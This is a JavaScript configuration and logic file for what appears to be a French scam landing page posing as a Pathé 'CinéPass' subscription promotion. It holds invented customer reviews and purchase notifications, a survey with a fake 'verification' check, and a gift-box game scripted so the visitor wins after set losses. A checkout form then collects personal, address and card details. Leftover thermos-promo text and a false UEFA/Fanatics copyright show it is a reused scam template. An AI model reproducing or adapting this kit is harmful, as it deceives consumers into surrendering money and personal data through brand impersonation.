const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(
  function (exp) {
    const countryCode = "fr";
    const lang = "fr-FR";
    const locale = lang;

    const sizes = {
      enabled: false,
      selectText: "Taille : ",
      arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
    };

    // JE REMPLIS CES INFORMATIONS DANS MAIN.JS
    const mainProduct = {
      header: "",
      name: "",
      oldPrice: "",
      newPrice: "",
      selectText: "",
      coupon: "",
      timer: "Cette semaine, vous ne pouvez commander qu'un seul produit à un prix promotionnel.",
      text: `
  Félicitations !<br><br>
  Vous avez participé à la promotion Stanley : vous avez la chance d'acheter le thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b> !
  `,
    };

    const notifications = [
      {
        user: "Manuel S*****",
        location: "Paris, France",
        action: "Je viens de recevoir le bijou pour 9,99 euros !",
        timeago: "il y a 15 secondes",
      },
      {
        user: "Carlos B******",
        location: "Lyon, France",
        action: "Je viens de recevoir le bijou pour 9,99 euros !",
        timeago: "il y a 25 secondes",
      },
    ];

    const reviewsArr = [
      {
        name: "Olivier Dupont:",
        time: "Il y a un jour",
        header: "C'est incroyable !",
        // product: "26468781",
        avatar: './src/img/2.jpg',
        review: "Je suis très content d'avoir trouvé cette promotion. Merci. Mon abonnement a été livré en 5 jours, je pensais que ce serait plus rapide.",
      },
      {
        name: "Émilie Martin:",
        time: "Il y a deux jours",
        header: "Fantastique ! Je n'ai pas de mots.",
        // product: "26468783",
        avatar: './src/img/1.jpg',
        review: "Au début, je n'y croyais pas et je pensais que c'était une arnaque. Mais mon mari m'a convaincue d'essayer. Trois jours plus tard, nous avons reçu l'abonnement. Nous avons eu la chance de gagner Cinépass DUO pour 6 mois.",
      },
      {
        name: "Jean Parker:",
        time: "Il y a deux jours",
        header: "Simplement génial.",
        // product: "26468784",
        avatar: './src/img/3.jpg',
        review: "Merci pour l'abonnement de 6 mois à un tel prix. C'est vraiment une promotion intéressante. Cela fonctionne dans tous les cinémas Pathé.",
      },
      {
        name: "Sophie Bertrand:",
        time: "Il y a quatre jours",
        header: "J'aime",
        // product: "26468781",
        avatar: './src/img/4.jpg',
        review: "J'ai été légèrement surprise par une telle réduction. Mais tout s'est bien passé. J'ai reçu mon abonnement et j'ai déjà pu en profiter.",
      },
      {
        name: "Guillaume Moreau:",
        time: "Il y a sept jours",
        header: "Wow, j'adore ce produit !",
        // product: "26468782",
        avatar: './src/img/5.jpg',
        review: "J'ai reçu mon abonnement le 6e jour après avoir passé la commande. Mais je suis vraiment content de l'avoir obtenu à un prix si avantageux :)",
      },
    ];

    const reviews = {
      reviews: reviewsArr,
      rr: "AVIS ET ÉVALUATIONS",
      percent: "99%",
      rec: "Si vous avez déjà un abonnement CinéPass actif, la durée de votre abonnement sera gelée pendant la durée de l'offre promotionnelle et sera prolongée.",
    };

    const questions = {
      _of: "Question {1} sur {2} : ",
      arr: [
        {
          q: "Avez-vous déjà visité les cinémas Pathé ?",
          a: [
            "Oui",
            "Non",
          ],
        },
        {
          q: "Avez-vous déjà utilisé des abonnements pour Pathé ou d'autres marques de cinéma ?",
          a: [
            "Oui",
            "Non",
          ],
        },
        {
          q: "Avez-vous plus de 18 ans ?",
          a: ["Oui", "Non"],
        },
      ],
    };

    const check = {
      title: "Votre réponse sera examinée",
      arr: [
        "Vous avez répondu à la question 3 sur 3",
        "Votre adresse IP ne montre aucune commande précédente",
        "Votre réponse a été vérifiée",
      ],
    };

    const modals = {
      welcome: {
        texts: {
          header: "Merci d'avoir participé à notre enquête !",
          button: "Tentez votre chance",
          text: `
<center>
    Choisissez une boîte-cadeau chanceuse..
    <br><br>
    Vous avez 3 tentatives, bonne chance !
</center>
            `,
        },
      },
      first: {
        texts: {
          header: "Oh, non...",
          button: "Réessayez",
          text: `
<center>
    Malheureusement, ce cadeau est vide. Il vous reste deux tentatives, bonne chance !
</center>
            `,
        },
      },
      win: {
        texts: {
          header: "Félicitations ! Vous êtes chanceux(se) !",
          button: "Passer la commande",
          text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Cliquez sur le bouton "Passer la commande", remplissez le formulaire et payez votre commande.
    <br>
    <br>
    Sous 3 à 5 jours, vous recevrez un colis avec votre carte d'abonnement et des instructions.
</center>
            `,
        },
      },
    };

    const cartSteps = {
      personal: {
        title: "Informations Personnelles",
        fields: {
          name: {
            enabled: true,
            field: "Prénom",
          },
          family: {
            enabled: true,
            field: "Nom",
          },
          phone: {
            enabled: true,
            field: "Numéro de téléphone",
          },
          email: {
            enabled: true,
            field: "Adresse e-mail",
          },
        },
      },
      delivery: {
        title: "Livraison",
        fields: {
          city: {
            enabled: true,
            field: "Ville",
          },
          address: {
            enabled: true,
            field: "Adresse de livraison",
          },
          zip: {
            enabled: true,
            field: "Code postal",
          },
        },
      },
      payment: {
        title: "Moyens de Paiement",
        creditCard: "Paiement en ligne par carte de crédit",
      },
    };

    const cart = {
      steps: cartSteps,
      main: {
        title: "Détails de la Commande",
        oldPrice: "68,70€",
        newPrice: "9,99 €",
        size: "Taille",
        subTotal: {
          title: "Sous-total",
          amount: "9,99 €",
        },
        deliveryTime: {
          title: "Délai de livraison",
          amount: "3 jours",
        },
        delivery: {
          title: "Livraison",
          amount: "0,00 €",
        },
        total: {
          title: "Total",
          amount: "9,99 €",
        },
        checkoutButton: "Payer votre commande",
      },
    };


    const products = [
      {
        id: "26468781",
        name: "CinéPass DUO : abonnement de 6 mois",
        miniImg: "./src/img/price.jpg",
        images: ["./src/img/price.jpg"],
      }
    ];

    const footer = {
      cr: "© 2024, UEFA and Fanatics, Inc.",
    };

    const pathImgBox = {
      lid: "./src/img/box-lid.png",
      lidIOs: "./src/img/box-lid-ios.png",
      inner: "./src/img/box-inner.png",
      innerGift: "./src/img/box-inner-gift.png",
      box: "./src/img/box.png",
      boxModal: "./src/img/box-modal.png",
    };

    exp.__config = {
      pathImgBox,
      countryCode,
      lang,
      locale,
      mainProduct,
      footer,
      check,
      questions,
      modals,
      cart,
      reviews,
      products,
      sizes,
      notifications,
    };
  })(window);

const siteKey = "cinepass-fr";

function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};


window.addEventListener("load", () => {
  starupCheck();
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => setCookie("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const enableFinalLoader = () => {
  const loader = document.querySelector(".loader__text");
  loader.setAttribute("style", "display: flex");
};
const disableFinalLoader = () => {
  const loader = document.querySelector(".loader__text");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});